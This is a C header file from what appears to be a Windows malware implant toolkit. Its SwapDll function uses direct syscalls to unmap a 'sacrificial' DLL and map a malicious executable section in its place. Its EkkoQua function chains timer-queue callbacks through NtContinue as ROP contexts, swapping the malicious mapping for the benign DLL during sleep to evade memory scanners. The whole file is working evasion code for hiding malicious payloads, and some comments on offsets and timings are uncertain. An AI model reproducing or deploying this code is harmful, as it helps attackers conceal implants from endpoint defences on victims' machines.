#pragma once

#include "syscalls.h"
#include "globals.h"

HANDLE SwapDll(SIZE_T MODULESIZE, PVOID SACDLLBASE) {
    
    HANDLE malHandle = NULL;
    NTSTATUS STATUS = 0x00;
    LARGE_INTEGER sectionSize = { MODULESIZE };

    //createsection
    if (STATUS = ZwCreateSection(&malHandle, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL, zwFunctions[ZwCreateSectionF].SSN, zwFunctions[ZwCreateSectionF].sysretAddr) != 0) {

        return NULL;
    }

    //unamep the sacrificial DLL 
    if (STATUS = ZwUnmapViewOfSection(((HANDLE)(LONG_PTR)-1), SACDLLBASE, zwFunctions[ZwUnmapViewOfSectionF].SSN, zwFunctions[ZwUnmapViewOfSectionF].sysretAddr) != 0) {

        return NULL;

    }
    
    //mapviewofsection of the malicious section at the same address as the sacdll

    if (STATUS = ZwMapViewOfSection(malHandle, ((HANDLE)(LONG_PTR)-1), &SACDLLBASE, NULL, NULL, NULL, &MODULESIZE, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE, zwFunctions[ZwMapViewOfSectionF].SSN, zwFunctions[ZwMapViewOfSectionF].sysretAddr) != 0) {

        return NULL;
    }

    return malHandle;

}


VOID EkkoQua(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize) {



    PDWORD64 newStack = NULL;
    PDWORD64 newStackMal = NULL;
    
    CONTEXT* CtxThread = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* RopUnmapMal = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* RopMapSac = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* RopDelay = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* RopMapMal = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* RopUnmapSac = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* RopSetEvt = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer = NULL;
    HANDLE  hEvent = NULL;
    PVOID   ImageBase = NULL;
    DWORD   ImageSize = 0;
    DWORD   HeadersSize = 0;
    DWORD   OldProtect = 0;


    PVOID   NtContinue = NULL;
    PVOID   SysFunc032 = NULL;
    PVOID   RtlMoveMemory = NULL;
    PVOID zwMapViewOfSection = NULL;
    hEvent = CreateEventW(0, 0, 0, 0);
    hTimerQueue = CreateTimerQueue();

    NtContinue = GetProcAddress(GetModuleHandleA("Ntdll"), "NtContinue");


    if (CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD)) //create timer 
    {
        WaitForSingleObject(hEvent, 0x32); 

        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery((LPVOID)CtxThread->Rsp, &mbi, sizeof(mbi)) == 0) {

            return;
        }
        newStack = (PDWORD64)VirtualAlloc(NULL, mbi.RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        newStackMal = (PDWORD64)VirtualAlloc(NULL, mbi.RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);



        memcpy(newStack, mbi.BaseAddress, mbi.RegionSize);
        memcpy(newStackMal, mbi.BaseAddress, mbi.RegionSize);
        SIZE_T delta = (CtxThread->Rsp - (ULONG_PTR)mbi.BaseAddress);
       
        if (CtxThread == NULL || RopUnmapMal == NULL || RopMapSac == NULL || RopDelay == NULL || RopMapMal == NULL || RopUnmapSac == NULL || RopSetEvt == NULL) {
            return;
        }
        memcpy(RopUnmapMal, CtxThread, sizeof(CONTEXT));
        memcpy(RopMapSac, CtxThread, sizeof(CONTEXT));
        memcpy(RopDelay, CtxThread, sizeof(CONTEXT));
        memcpy(RopMapMal, CtxThread, sizeof(CONTEXT));
        memcpy(RopUnmapSac, CtxThread, sizeof(CONTEXT));
        memcpy(RopSetEvt, CtxThread, sizeof(CONTEXT));



        (*RopUnmapMal).Rsp -= 8;
        (*RopUnmapMal).Rip = (DWORD64)UnmapViewOfFile;
        (*RopUnmapMal).Rcx = (DWORD64)(ImageBaseDLL);

        (*RopMapSac).Rsp = (DWORD64)((PBYTE)newStack + delta);
        (*RopMapSac).Rsp -= 8;
        (*RopMapSac).Rip = (DWORD64)MapViewOfFileEx;
        (*RopMapSac).Rcx = (DWORD64)sacDllHandle;
        (*RopMapSac).Rdx = FILE_MAP_ALL_ACCESS;
        (*RopMapSac).R8 = (DWORD64)0x00;
        (*RopMapSac).R9 = (DWORD64)0x00;
        *((PDWORD64)((*RopMapSac).Rsp + 40)) = viewSize; //this one is either 28 hex or 40 dec 
        *((PDWORD64)((*RopMapSac).Rsp + 48)) = (ULONGLONG)(ImageBaseDLL);

        // WaitForSingleObject( hTargetHdl, SleepTime );
        (*RopDelay).Rsp -= 8;
        (*RopDelay).Rip = (DWORD64)WaitForSingleObject;
        (*RopDelay).Rcx = (DWORD64)((HANDLE)(LONG_PTR)-1);
        (*RopDelay).Rdx = 0x1388; //it should be 6 or 7 secs in hex

        (*RopUnmapSac).Rsp -= 8;
        (*RopUnmapSac).Rip = (DWORD64)UnmapViewOfFile;
        (*RopUnmapSac).Rcx = (DWORD64)(ImageBaseDLL);

       
        (*RopMapMal).Rsp = (DWORD64)((PBYTE)newStackMal + delta);
        (*RopMapMal).Rsp -= 8;
        (*RopMapMal).Rip = (DWORD64)MapViewOfFileEx;
        (*RopMapMal).Rcx = (DWORD64)malDllHandle;
        (*RopMapMal).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
        (*RopMapMal).R8 = (DWORD64)0x00;
        (*RopMapMal).R9 = (DWORD64)0x00;
        *(ULONG_PTR*)((*RopMapMal).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
        *(ULONG_PTR*)((*RopMapMal).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;
        
        (*RopSetEvt).Rsp -= 8;
        (*RopSetEvt).Rip = (DWORD64)SetEvent;
        (*RopSetEvt).Rcx = (DWORD64)hEvent;


        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopUnmapMal, 100, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopMapSac, 200, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopDelay, 300, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopUnmapSac, 400, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopMapMal, 500, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);


        WaitForSingleObject(hEvent, INFINITE);



    }

    DeleteTimerQueue(hTimerQueue);
    // Clean up allocated memory
    if (CtxThread) VirtualFree(CtxThread, 0, MEM_RELEASE);
    if (RopUnmapMal) VirtualFree(RopUnmapMal, 0, MEM_RELEASE);
    if (RopMapSac) VirtualFree(RopMapSac, 0, MEM_RELEASE);
    if (RopDelay) VirtualFree(RopDelay, 0, MEM_RELEASE);
    if (RopMapMal) VirtualFree(RopMapMal, 0, MEM_RELEASE);
    if (RopUnmapSac) VirtualFree(RopUnmapSac, 0, MEM_RELEASE);
    if (RopSetEvt) VirtualFree(RopSetEvt, 0, MEM_RELEASE);
    if (newStack) VirtualFree(newStack, 0, MEM_RELEASE);
    if (newStackMal) VirtualFree(newStackMal, 0, MEM_RELEASE);

    return;
}


